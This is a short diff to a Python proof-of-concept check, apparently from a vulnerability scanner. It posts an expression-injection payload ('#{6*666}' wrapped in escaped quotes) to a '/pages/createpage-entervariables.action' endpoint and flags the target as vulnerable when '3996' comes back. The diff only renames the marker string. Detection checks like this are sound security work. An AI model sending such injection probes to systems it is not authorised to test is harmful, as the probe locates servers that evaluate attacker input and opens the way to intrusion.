@@ -53,7 +53,7 @@ class POC(POCBase):
         """
         vuln = [False,""]
         url = self.target + "/pages/createpage-entervariables.action?SpaceKey=x" # url自己按需调整
-        data = "queryString=Blen\\u0027%2b#{6*666}%2b\\u0027"
+        data = "queryString=ofx\\u0027%2b#{6*666}%2b\\u0027"
         
         headers = {"User-Agent":get_random_ua(),
                     "Connection":"close",
@@ -65,7 +65,7 @@ class POC(POCBase):
             检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
             req = requests.post(url,data=data,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
-            if "Blen{3996=null}" in req.text:
+            if "ofx{3996=null}" in req.text:
                 vuln = [True,req.text]
             else:
                 vuln = [False,req.text]
